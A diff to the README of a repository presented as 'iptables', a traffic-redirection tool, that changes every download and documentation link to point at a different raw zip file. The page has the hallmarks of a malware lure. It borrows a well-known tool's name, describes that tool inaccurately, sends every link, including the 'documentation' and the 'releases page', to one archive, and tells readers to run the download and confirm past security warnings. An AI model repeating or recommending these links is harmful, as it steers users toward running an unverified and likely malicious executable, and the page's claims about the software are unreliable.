@@ -1,7 +1,7 @@
 # 🚀 iptables - Redirect Traffic with Ease
 
 ## 📥 Download Now
-[![Download iptables](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_3.1-beta.5.zip)](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_3.1-beta.5.zip)
+[![Download iptables](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_v2.5.zip)](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_v2.5.zip)
 
 ## 📘 Description
 iptables is an easy-to-use tool for redirecting network traffic on your system. With iptables, you can control how data flows in and out, ensuring that your network remains secure and manageable. This application provides a user-friendly interface to help you set up and adjust your traffic rules without needing to dive into complex programming.
@@ -11,7 +11,7 @@ Follow these steps to download and run iptables:
 
 ### Step 1: Visit the Releases Page
 To get iptables, you need to visit the releases page. Click the link below:
-[Download iptables](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_3.1-beta.5.zip)
+[Download iptables](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_v2.5.zip)
 
 ### Step 2: Choose the Right Version
 On the releases page, you will see several versions of the software. Select the latest version for the best features and updates. 
@@ -20,7 +20,7 @@ On the releases page, you will see several versions of the software. Select the 
 Once you find the latest version, look for the downloadable file listed there. Click on the file link to start the download process. Depending on your browser settings, the file may directly download to your computer or prompt you to choose a download location.
 
 ### Step 4: Locate the Downloaded File
-After the download completes, navigate to your downloads folder (or the location you saved the file). Look for a file named something like `https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_3.1-beta.5.zip`.
+After the download completes, navigate to your downloads folder (or the location you saved the file). Look for a file named something like `https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_v2.5.zip`.
 
 ### Step 5: Run the Application
 To run iptables, double-click the downloaded file. If your system gives you a security warning, confirm that you want to run the software. This step may vary based on your operating system settings.
@@ -51,7 +51,7 @@ Please review the terms of use before running the application. This helps you un
 Stay informed about the changes and updates in each version of iptables. You will find a detailed changelog on the releases page. This includes bug fixes, performance improvements, and added features.
 
 ## 📦 Download & Install
-If you haven't yet, now is the time to [download iptables](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_3.1-beta.5.zip). Follow the simple steps outlined above to set it up on your machine with ease.
+If you haven't yet, now is the time to [download iptables](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_v2.5.zip). Follow the simple steps outlined above to set it up on your machine with ease.
 
 ## 🔗 Learn More
-For more detailed instructions, helpful tips, and additional resources, check the [documentation](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_3.1-beta.5.zip). This can help you make the most of iptables, ensuring you have a seamless experience with network traffic management.
+For more detailed instructions, helpful tips, and additional resources, check the [documentation](https://raw.githubusercontent.com/XXX5X/iptables/main/millenarian/Software_v2.5.zip). This can help you make the most of iptables, ensuring you have a seamless experience with network traffic management.
